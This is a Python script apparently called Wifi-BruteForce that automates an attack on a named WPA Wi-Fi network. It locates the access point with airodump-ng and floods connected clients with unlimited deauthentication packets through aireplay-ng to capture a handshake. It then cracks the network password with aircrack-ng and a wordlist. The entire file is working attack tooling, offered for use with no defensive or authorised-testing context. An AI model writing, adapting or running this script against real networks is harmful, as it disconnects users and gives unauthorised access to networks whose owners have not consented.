import argparse, subprocess, shutil, os, threading, time, csv, sys
from colorama import Fore, Style



# Print text with color
def color_print(text, color=Fore.WHITE):
    print(color + text + Style.RESET_ALL)


def tite():
    subprocess.run(["clear",])
    color_print(r""" __        ___  __ _           ____             _       _____                  
 \ \      / (_)/ _(_)         | __ ) _ __ _   _| |_ ___|  ___|__  _ __ ___ ___ 
  \ \ /\ / /| | |_| |  _____  |  _ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \
   \ V  V / | |  _| | |_____| | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/
    \_/\_/  |_|_| |_|         |____/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|                                                                               
""", Fore.CYAN)
    print("- AUTHOR: Sylpha\n- Version: BETA\n\n")




def run_command_with_output(command):
        command = subprocess.check_output(command.split())
        print(command.decode())



class WifiBruteForce:
    def __init__(self,
                 wifi_name,
                 timeout_get_MAC,
                 packet_capture_timeout,
                 wordlistPath,
                 cpuLimit
                 ):
        
        # STEP 1
        self.setup()

        # STEP 2
        self.wifiName = wifi_name
        self.timeoutGetMAC = self.check_TIMEOUT_format(timeout_get_MAC)
        self.MAC, self.CHANNEL = self.get_MAC_and_CHANNEL_with_name()

        self.packetCaptureTimeout = self.check_TIMEOUT_format(packet_capture_timeout)
        
        # STEP 3
        self.cpDirPath = "./CP"
        if os.path.exists(self.cpDirPath):
            shutil.rmtree(self.cpDirPath)
        os.mkdir(self.cpDirPath)
        self.cpFilePath = os.path.join(self.cpDirPath, "CP")
        self.cpFilePath2 = "./CP.temp"

        color_print("> Capturing packets...", Fore.BLUE)
        threading.Thread(target=self.capture_packets).start()
        time.sleep(2)
        self.running = True
        isFounded = self.deauth()
        os.remove(self.cpFilePath2)
        if isFounded:
            color_print("> Packet capture successful", Fore.GREEN)
        else:
            color_print("> Timeout!", Fore.RED)
            sys.exit(0)
        

        # STEP 4
        print(f"> Wordlist: {wordlistPath}")
        self.wordlistPath = wordlistPath
        self.cpuLimit = cpuLimit
        self.capFile = self.cpFilePath + "-01.cap"
        color_print("> Checking password...", Fore.BLUE)
        self.passwordPath = "./pass.temp"
        password = self.bruteforce()
        if password is not None:
            color_print(f"Password: {password}", Fore.GREEN)
        else:
            color_print("Password not found", Fore.RED)

        subprocess.run("sudo airmon-ng stop wlan1mon".split())
        sys.exit(0)


    def bruteforce(self):
        subprocess.run(
            f"sudo aircrack-ng -w {self.wordlistPath} -b {self.MAC} {self.capFile} -p {self.cpuLimit} -l {self.passwordPath}".split(),
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
            )
        
        if os.path.exists(self.passwordPath):
            with open(self.passwordPath, "r") as file:
                password = file.read().strip()
            file.close()
            os.remove(self.passwordPath)
            return password
        
        return None


    
    def is_WPA_handshake(self):
        with open(self.cpFilePath2, 'r', encoding='utf-8') as file:
            d = file.read()
        file.close()
        return "WPA handshake" in d


    def deauth(self):
        try:
            p = subprocess.Popen(
                f"sudo aireplay-ng --deauth 0 -a {self.MAC} wlan1mon".split(),
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.DEVNULL
                )
            
            while 1:
                if self.is_WPA_handshake():
                    self.running = False
                    p.terminate()
                    return True 
                elif not self.running:
                    p.terminate()
                    return False
        except:
            pass
        finally:
            p.wait()

    
    def setup(self):
        if "wlan1" not in subprocess.check_output(["iwconfig",],stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL).decode():
            color_print("> No wlan1 interface found. Please connect to USB WIFI and try again.\n", Fore.RED)
            sys.exit(0)
        try:
            color_print("> Running airmon-ng start wlan1", Fore.BLUE)
            run_command_with_output("sudo airmon-ng start wlan1")
        except:  # RECONNECT
            color_print("> Reconnecting...", Fore.BLUE)
            run_command_with_output("sudo airmon-ng stop wlan1mon")
            color_print("> Running airmon-ng start wlan1", Fore.BLUE)
            run_command_with_output("sudo airmon-ng start wlan1")
    

    
    def get_MAC_and_CHANNEL_with_name(self):
        color_print(f"> Getting MAC and CHANNEL with name '{self.wifiName}'. Timeout: {self.timeoutGetMAC}...", Fore.BLUE)

        dirTempPath = "./GMACWN"

        if os.path.exists(dirTempPath):
            shutil.rmtree(dirTempPath)

        os.mkdir(dirTempPath)
        
        filePath = os.path.join(dirTempPath, "GMACWN")

        subprocess.run(
            f"sudo timeout {self.timeoutGetMAC} airodump-ng wlan0 --write {filePath}".split(),
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
            )

        filePath2 = filePath + "-01.csv"
        with open(filePath2, 'r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if any(self.wifiName in cell for cell in row):
                    shutil.rmtree(dirTempPath)
                    MAC, CHANNEL = (row[0].strip(), row[3].strip())

                    color_print(f"> Founded:\nMAC: {MAC}\nCHANNEL: {CHANNEL}", Fore.GREEN)
                    file.close()
                    return MAC, CHANNEL
                
        file.close()
        
        color_print("> MAC and CHANNEL not found!", Fore.RED)
        sys.exit(0)
    

    def capture_packets(self):
        with open(self.cpFilePath2, "w") as file:
            try:
                p = subprocess.Popen(
                    f"sudo timeout {self.packetCaptureTimeout} airodump-ng --bssid {self.MAC} -c {self.CHANNEL} -w {self.cpFilePath} wlan1mon".split(),
                    stdout=file, 
                    stderr=subprocess.DEVNULL
                    )
                while p.poll() is None:
                    if self.is_WPA_handshake():
                        p.terminate()
                        file.close()
                        return   

                self.running = False
                p.terminate()
                file.close() 
                return
            except:
                pass
            finally:
                p.wait()


    def check_TIMEOUT_format(self, timeout):
        return timeout if timeout[-1] == "s" else timeout + "s"


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='WIFI BruteForce')

    parser.add_argument("--name", "-n", default="", type=str, help="WIFI name to find MAC address")
    parser.add_argument("--timeout-mac", "-tm", type=str, default="5s", help="Time to find MAC. Default: < 5s >")
    parser.add_argument("--timeout-packet", "-tp", type=str, default="0s", help="Time to capture packet. Default: < 0s > infinite")

    defaultWordListPath = "./wordlist/common.txt"
    parser.add_argument("--wordlist", "-w", type=str, default=defaultWordListPath, help="Path to wordlist")

    parser.add_argument("--limit", "-l", type=str, default="10", help="CPU limit (1-10 = 10%%-100%%). Default: 10")

    args = parser.parse_args()

    wifiName = args.name.strip()
    timeoutGetMAC = args.timeout_mac.strip()
    packetCaptureTimeout = args.timeout_packet.strip()
    wordlistPath = args.wordlist.strip()
    cpuLimit = args.limit.strip()

    if wifiName == "":
        color_print("--name NAME, -n NAME", Fore.RED)
        sys.exit(0)
    if not os.path.isfile(wordlistPath):
        color_print(f"File not found: {wordlistPath}", Fore.RED)
        sys.exit(0)
    
    if not timeoutGetMAC.replace("s", "").isdigit() and not packetCaptureTimeout.replace("s", "").isdigit():
        color_print("Timeout must be a number", Fore.RED)
        sys.exit(0)

    if not cpuLimit.isdigit():
        color_print("CPU limit must be a number", Fore.RED)
        sys.exit(0)
    if int(cpuLimit) > 10 or int(cpuLimit) < 1:
        color_print("1 - 10 == 10% - 100% CPU", Fore.RED)
        sys.exit(0)

    
    if not 'SUDO_UID' in os.environ.keys():
        print("Running with sudo!")
        sys.exit(0)
    tite()
    
    WifiBruteForce(wifiName, timeoutGetMAC, packetCaptureTimeout, wordlistPath, cpuLimit)